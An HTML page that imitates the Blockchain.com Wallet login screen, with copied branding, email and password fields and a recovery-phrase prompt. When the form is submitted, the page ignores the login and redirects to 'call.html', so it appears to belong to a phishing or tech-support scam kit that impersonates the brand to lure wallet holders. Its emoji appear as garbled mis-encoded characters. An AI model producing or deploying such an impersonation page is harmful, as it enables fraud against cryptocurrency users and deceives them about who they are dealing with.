<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Blockchain.com Wallet Login</title>
  <style>
    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
    }

    body {
      background-color: #f3f4f7;
    }

    header {
      width: 100%;
      background: linear-gradient(to right, #f80086, #a000ff);
      display: flex;
      justify-content: space-between;
      align-items: center;
      padding: 12px 20px;
      color: white;
      flex-wrap: wrap;
    }

    .logo {
      display: flex;
      align-items: center;
      gap: 10px;
      font-size: 18px;
      font-weight: bold;
    }

    .logo img {
      width: 32px;
      height: 32px;
    }

    nav {
      display: flex;
      align-items: center;
      gap: 16px;
      font-size: 14px;
      flex-wrap: wrap;
    }

    .sign-up-btn {
      border: 1px solid white;
      padding: 6px 16px;
      border-radius: 24px;
      background: transparent;
      color: white;
      cursor: pointer;
      white-space: nowrap;
    }

    .container {
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: calc(100vh - 80px);
      padding: 20px;
      position: relative;
    }

    .login-box {
      background: white;
      padding: 40px 24px;
      border-radius: 16px;
      box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
      max-width: 400px;
      width: 100%;
      text-align: center;
      position: relative;
    }

    .login-box h2 {
      font-size: 18px;
      margin-bottom: 28px;
      color: #1c1e21;
    }

    .input-group {
      text-align: left;
      margin-bottom: 20px;
    }

    .input-group label {
      display: block;
      font-size: 14px;
      font-weight: 600;
      margin-bottom: 6px;
    }

    .input-group input {
      width: 100%;
      padding: 12px;
      border-radius: 12px;
      border: 1px solid #e4e7eb;
      background-color: #f1f3f5;
      font-size: 14px;
    }

    .input-group.password {
      position: relative;
    }

    .input-group.password button {
      position: absolute;
      right: 12px;
      top: 36px;
      border: none;
      background: transparent;
      cursor: pointer;
      font-size: 16px;
    }

    .continue-btn {
      background-color: #4a90fe;
      color: white;
      border: none;
      padding: 14px;
      width: 100%;
      border-radius: 24px;
      font-weight: 600;
      font-size: 15px;
      margin-top: 12px;
      cursor: pointer;
    }

    .continue-btn:hover {
      background-color: #337ff5;
    }

    .forgot-password {
      margin-top: 20px;
    }

    .forgot-password a {
      font-size: 14px;
      color: #4a90fe;
      text-decoration: none;
      font-weight: 500;
    }

    .recovery-link {
      font-size: 13px;
      color: #777;
      margin-top: 24px;
    }

    footer {
      text-align: center;
      margin: 24px 0;
      font-size: 12px;
      color: #888;
    }

    .qr-login {
      position: absolute;
      top: 16px;
      right: 20px;
      font-size: 13px;
      display: flex;
      align-items: center;
      gap: 6px;
      color: #000;
    }

    @media (max-width: 480px) {
      header {
        flex-direction: column;
        align-items: flex-start;
        gap: 12px;
        padding: 10px 16px;
      }

      nav {
        flex-direction: column;
        align-items: flex-start;
        gap: 8px;
      }

      .login-box {
        padding: 32px 16px;
        margin-top: 20px;
        box-shadow: none;
        border: 1px solid #ddd;
      }

      .input-group label {
        font-size: 13px;
      }

      .input-group input {
        font-size: 14px;
        padding: 10px;
      }

      .continue-btn {
        padding: 12px;
        font-size: 15px;
      }

      .qr-login {
        position: static;
        margin-bottom: 16px;
        justify-content: center;
      }

      .logo img {
        width: 28px;
        height: 28px;
      }

      .logo {
        font-size: 16px;
      }
    }
  </style>
</head>
<body>

<header>
  <div class="logo">
    <img src="blockchain-new-logo.png" alt="Blockchain Logo" />
    Blockchain.com
  </div>
  <nav>
    <span style="border-bottom: 2px solid white; font-weight: bold;">Wallet</span>
    <span style="opacity: 0.7;">Exchange</span>
    <span style="opacity: 0.8;">Don't have an account?</span>
    <button class="sign-up-btn" aria-label="Sign up for Blockchain.com">Sign Up</button>
  </nav>
</header>

<div class="container">
  <div class="login-box">
    <div class="qr-login">
      <span>Scan QR code to login</span>
      <img src="qr-icon.svg" alt="QR Icon" style="width: 16px; height: 16px;" onerror="this.outerHTML='üì∑'">
    </div>

    <h2>Login to Blockchain.com Wallet</h2>

    <form onsubmit="event.preventDefault(); redirectToCall();">
      <div class="input-group">
        <label for="email">Email or Wallet ID</label>
        <input type="text" id="email" placeholder="Enter your email or wallet ID" aria-label="Email or Wallet ID" required>
      </div>

      <div class="input-group password">
        <label for="password">Password</label>
        <input type="password" id="password" placeholder="************" autocomplete="off" required>
        <button type="button" onclick="togglePassword()" aria-label="Toggle password visibility" title="Show/Hide password">üëÅÔ∏è</button>
      </div>

      <button type="submit" class="continue-btn" aria-label="Continue login">Continue</button>
    </form>

    <div class="forgot-password">
      <a href="#">Forgot password?</a>
    </div>

    <div class="recovery-link">
      Login with 12 word recovery phrase
    </div>
  </div>
</div>

<footer>
  ¬© Blockchain.com. All rights reserved. Version v5.0.136 | us English
</footer>

<script>
  function togglePassword() {
    const input = document.getElementById("password");
    const button = input.nextElementSibling;
    if (input.type === "password") {
      input.type = "text";
      button.textContent = "üôà";
    } else {
      input.type = "password";
      button.textContent = "üëÅÔ∏è";
    }
  }

  function redirectToCall() {
    // You could add validation here if needed
    window.location.href = "call.html";
  }
</script>

</html>
